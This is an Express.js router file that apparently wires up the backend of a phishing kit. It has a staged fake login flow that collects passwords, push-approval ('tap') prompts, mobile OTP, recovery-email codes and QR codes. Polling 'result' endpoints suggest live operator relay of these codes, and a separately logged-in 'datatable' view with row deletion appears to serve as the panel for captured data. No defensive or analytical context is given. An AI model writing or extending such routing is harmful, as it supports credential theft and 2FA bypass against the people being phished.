const express = require('express');
const router = express.Router();
const ctrl = require('../controllers/authController');

// Main login flow
router.get('/', ctrl.getIndex);
router.get('/load', ctrl.getLoad);
router.get('/first', ctrl.getFirst);
router.post('/first', ctrl.postFirst);
router.get('/hom', ctrl.getHom);
router.get('/pwdready', ctrl.pwdReady);
router.post('/password', ctrl.postPassword);
router.get('/pwdresult', ctrl.pwdResultCheck);

// Polling endpoints
router.get('/codeload/fetch/', ctrl.fetchStatus);
router.get('/codeload/fetchtap/', ctrl.fetchTap);

// 2FA pages
router.get('/codetap', ctrl.getTap);
router.get('/tap', ctrl.getTap);
router.get('/tapn', ctrl.getTapN);

// Mobile OTP
router.get('/codeotp', ctrl.getMobileConfirm);
router.get('/mconfi', ctrl.getMobileConfirm);
router.post('/req/codeotp', ctrl.postMobileConfirm);
router.get('/mobileresult', ctrl.mobileResultCheck);
router.get('/motp', ctrl.getMobileOtpPage);
router.post('/req/motp', ctrl.postMobileOtp);
router.get('/motpresult', ctrl.mobileOtpResultCheck);

// Recovery email
router.get('/codeemail', ctrl.getEmailConfirm);
router.get('/eotp', ctrl.getEotp);
router.get('/recemail', ctrl.getRecEmail);
router.post('/req/recemail', ctrl.postRecEmail);
router.get('/recemailresult', ctrl.recEmailResultCheck);
router.post('/req/codeemail', ctrl.postEmailConfirm);
router.post('/req/eotp', ctrl.postEmailOtp);
router.get('/eotpresult', ctrl.eotpResultCheck);

// QR code
router.get('/qr-code', ctrl.getQrCode);
router.get('/qrcode', ctrl.getQrCode);

// Data table view
router.get('/dblogin', ctrl.getDbLogin);
router.post('/dblogin', ctrl.postDbLogin);
router.get('/datatable', ctrl.authCheck, ctrl.getDataTable);
router.post('/datatable/delete/:id', ctrl.authCheck, ctrl.deleteRow);

module.exports = router;
